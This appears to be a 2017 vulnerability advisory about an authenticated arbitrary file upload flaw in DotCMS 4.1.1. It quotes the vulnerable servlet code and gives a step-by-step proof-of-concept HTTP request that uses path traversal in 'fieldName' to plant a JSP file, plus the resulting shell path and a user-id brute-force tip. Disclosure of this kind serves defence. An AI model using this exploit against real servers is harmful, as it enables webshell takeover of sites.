@@ -1,0 +1,125 @@
+id: 28153
+date: 07/19/2017
+title: DotCMS 4.1.1 Shell Upload Vulnerability
+author: Xiaotian Wang
+cves: 
+
+==========================
+Advisory: DotCMS /servlets/ajax_file_upload Arbitrary File Upload Vulnerability
+Author: M3@pandas From DBAppSecurity Security Lab
+Email: xiaotian.wang@dbappsecurity.com.cn
+Affected Version: 4.1.1 the latest version
+========================== 
+Vulnerability Description
+==========================
+Recetly, I found an Arbitrary File Upload Vulnerability in 'DotCMS' program, DotCMS is widely used in many companies. 
+
+Vulnerable cgi: /dotcms_4.1.1_999999.jar!/com/dotmarketing/servlets/AjaxFileUploadServlet.class: 
+
+private void doFileUpload(HttpSession session, HttpServletRequest request, HttpServletResponse response)
+    throws IOException
+  {
+    String fieldName = null;
+    AjaxFileUploadListener listener = null;
+    try
+    {
+      String fileName = "";
+      
+      listener = new AjaxFileUploadListener(request.getContentLength());
+      FileItemFactory factory = new MonitoredDiskFileItemFactory(listener);
+      fieldName = request.getParameter("fieldName");
+      Enumeration params = request.getParameterNames();
+      session.setAttribute("FILE_UPLOAD_STATS_" + fieldName, listener.getFileUploadStats());
+      ServletFileUpload upload = new ServletFileUpload(factory);
+      
+      List items = upload.parseRequest(request);
+      boolean hasError = false;
+      this.isEmptyFile = false;
+      
+      String userId = null;
+      if (UtilMethods.isSet(session.getAttribute("USER_ID")))
+      {
+        userId = (String)session.getAttribute("USER_ID");
+        User user = UserLocalManagerUtil.getUserById(userId);
+        if ((!UtilMethods.isSet(user)) || (!UtilMethods.isSet(user.getUserId()))) {
+          throw new Exception("Could not upload File. Invalid User");
+        }
+      }
+      else
+      {
+        throw new Exception("Could not upload File. Invalid User");
+      }
+      for (Iterator i = items.iterator(); i.hasNext();)
+      {
+        FileItem fileItem = (FileItem)i.next();
+        if (!fileItem.isFormField())
+        {
+          if (fileItem.getSize() == 0L) {
+            this.isEmptyFile = true;
+          }
+          if (fileItem.getName().contains(File.separator)) {
+            fileName = fileItem.getName().substring(fileItem
+              .getName().lastIndexOf(File.separator) + 1);
+          } else {
+            fileName = fileItem.getName();
+          }
+          fileName = ContentletUtil.sanitizeFileName(fileName);
+          
+          File tempUserFolder = new File(APILocator.getFileAssetAPI().getRealAssetPathTmpBinary() + File.separator + userId + File.separator + fieldName);
+          if (!isValidPath(tempUserFolder.getCanonicalPath())) {
+            throw new IOException("Invalid fileName or Path");
+          }
+          if (!tempUserFolder.exists()) {
+            tempUserFolder.mkdirs();
+          }
+          File dest = new File(tempUserFolder.getAbsolutePath() + File.separator + fileName);
+          if (dest.exists()) {
+            dest.delete();
+          }
+          fileItem.write(dest);
+          fileItem.delete();
+        }
+      }
+      if (this.isEmptyFile) {
+        fileName = "";
+      }
+      if (!hasError) {
+        sendCompleteResponse(response, null);
+      } else {
+        sendCompleteResponse(response, "Could not process uploaded file. Please see log for details.");
+      }
+    }
+    catch (Exception e)
+    {
+      listener.error("error");
+      session.setAttribute("FILE_UPLOAD_STATS_" + fieldName, listener.getFileUploadStats());
+      sendCompleteResponse(response, e.getMessage());
+      e.printStackTrace();
+    }
+  }
+
+
+tempUserFolder can be controlled through paramter 'fieldName', the upload data is not filtered and the uploaded path can be user-definedi1/4so attacker with the administrator authority can upload evil jsp webshell file to control the whole web site or even the web server. 
+==========================
+POC && EXP
+==========================
+1. Login as administrator 
+2. POST /servlets/ajax_file_upload?fieldName=../ HTTP/1.1
+   Host: 192.168.1.204:8080
+   Accept-Encoding: gzip, deflate
+   Content-Type: multipart/form-data; boundary=--------1234995635
+   Cookie: your own cookies
+   Connection: close
+   Content-Length: 138
+
+   ----------1234995635
+   Content-Disposition: form-data; name="xxx"; filename="test.jsp"
+
+   <% out.print("test_for_fun!");%>
+   ----------1234995635--
+
+3. shell is : http://192.168.1.204:8080/assets/tmp_upload/test.jsp 
+   
+   Attension: In some other cases: 'filedName=' , then shell will be in 'assets/tmp_upload/dotcms.org.1/' like this:http://192.168.1.204:8080/assets/tmp_upload/dotcms.org.1/test.jsp , 'dotcms.org.1' is your userid, even if you do not know your userid, you can bruteforce the number behind ' dotcms.org.'
+
+#  0day.today [2023-03-22]  #
